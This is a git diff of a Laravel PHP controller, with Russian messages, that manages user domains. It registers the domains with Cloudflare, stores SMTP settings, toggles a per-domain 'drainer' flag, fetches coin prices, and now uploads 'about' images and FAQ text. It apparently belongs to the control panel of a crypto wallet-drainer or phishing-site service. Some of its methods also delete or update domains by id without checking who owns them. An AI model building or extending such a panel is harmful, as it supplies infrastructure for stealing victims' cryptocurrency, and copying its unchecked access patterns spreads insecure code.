@@ -20,40 +20,63 @@ class DomainController extends Controller
         return view('admin.domains', ['domains' => $domains]);
     }
 
-    public function get($id){
+    public function get($id)
+    {
         $domain = Domain::where('id', $id)->where("user_id", Auth::user()->id)->first()->toArray();
         return response()->json($domain, 201);
     }
-    public function indexAdd(){
+
+    public function indexAdd()
+    {
 
         return view('admin.domain_add');
     }
+
     public function updateData(Request $request)
     {
         $user = $request->user();
-        if($user->users_status == "admin"){
+        if ($user->users_status != "admin") {
+            $domain = Domain::where('id', $request->id)->where("user_id", $user->id)->first();
+        } else {
             $domain = Domain::where('id', $request->id)->first();
         }
-        else{
-            $domain = Domain::where('id', $request->id)->where("user_id", $user->id)->first();
+
+        if (!$domain) return response()->json(['message' => 'Домен не найден'], 401);
+
+        if ($request->hasFile('about_img1')) {
+            $img_1 = $request->file('about_img1');
+            $img_1_name = time() . '_1.' . $img_1->extension();
+            $img_1->move(public_path('images/users/about'), $img_1_name);
+            $domain->about_img1 = 'images/users/about/' . $img_1_name;
         }
-        if(!$domain) return response()->json(['message' => 'Домен не найден'], 401);
+
+        if ($request->hasFile('about_img2')) {
+            $img_2 = $request->file('about_img2');
+            $img_2_name = time() . '_2.' . $img_2->extension();
+            $img_2->move(public_path('images/users/about'), $img_2_name);
+            $domain->about_img2 = 'images/users/about/' . $img_2_name;
+        }
+
         $drainer = $request->drainer == "enable" ? 1 : 0;
         $domain->title = $request->title;
         $domain->drainer = $drainer;
+        $domain->about_text1 = $request->about_text1;
+        $domain->about_text2 = $request->about_text2;
+        $domain->faq = $request->faq;
         $domain->save();
+
         return response()->json(['message' => 'Данные успешно обновлены'], 201);
     }
-    public function test(){
+    public function test()
+    {
         $CourseFunction = new CourseFunction();
         $coins = Coin::all();
         $data = [];
-        foreach ($coins as $coin){
-            try{
+        foreach ($coins as $coin) {
+            try {
 
-            $data[] = [$coin["full_name"] => $CourseFunction->getCoinPrice($coin["full_name"])];
-            }
-            catch (\Exception $e){
+                $data[] = [$coin["full_name"] => $CourseFunction->getCoinPrice($coin["full_name"])];
+            } catch (\Exception $e) {
                 $data[] = [$coin["full_name"] => ""];
             }
         }
@@ -61,7 +84,8 @@ class DomainController extends Controller
         return json_encode($data);
     }
 
-    public function create(Request $request){
+    public function create(Request $request)
+    {
         $validator = Validator::make($request->all(), [
             'domain' => 'required|unique:domains,domain',
             'stmp_host' => 'required',
@@ -83,14 +107,12 @@ class DomainController extends Controller
         $cloudflareFunction = new CloudflareFunction();
         try {
             $data = $cloudflareFunction->add_domain_cloudflare($request->domain);
-        }
-        catch (\Exception $exception){
+        } catch (\Exception $exception) {
             try {
                 $zone_id = $cloudflareFunction->get_zoneid($request->domain);
                 $ns_list = $cloudflareFunction->get_ns_list($request->domain);
                 $data = ["zone_id" => $zone_id, "ns_list" => $ns_list];
-            }
-            catch (\Exception $e){
+            } catch (\Exception $e) {
                 return response()->json(['message' => 'Ошибка при добавлении домена. Возможно этот домен уже привязан к Cloudflare.'], 401);
             }
         }
@@ -249,13 +271,14 @@ class DomainController extends Controller
         $domain->user_id = $request->user()->id;
         $domain->zone_id = $zone_id;
 
-        if(!$domain->save()){
+        if (!$domain->save()) {
             return response()->json(['message' => 'Ошибка при добавлении домена. Возможно этот домен уже привязан к Cloudflare'], 401);
         }
-        return response()->json(['message' => 'Домен успешно добавлен. Теперь привяжите NS-записи к домену', 'ns_list'=>$ns_list], 201);
+        return response()->json(['message' => 'Домен успешно добавлен. Теперь привяжите NS-записи к домену', 'ns_list' => $ns_list], 201);
     }
 
-    public function updateStatusCloudflare($id){
+    public function updateStatusCloudflare($id)
+    {
         $cloudflareFunction = new CloudflareFunction();
         $domain = Domain::where('id', $id)->first();
         $zone_id = $domain->zone_id;
@@ -266,7 +289,8 @@ class DomainController extends Controller
 
     }
 
-    public function delete($id){
+    public function delete($id)
+    {
         $domain = Domain::where('id', $id)->first();
         $CloudflareFunction = new CloudflareFunction();
         $CloudflareFunction->delete_domain_cloudflare($domain['domain']);
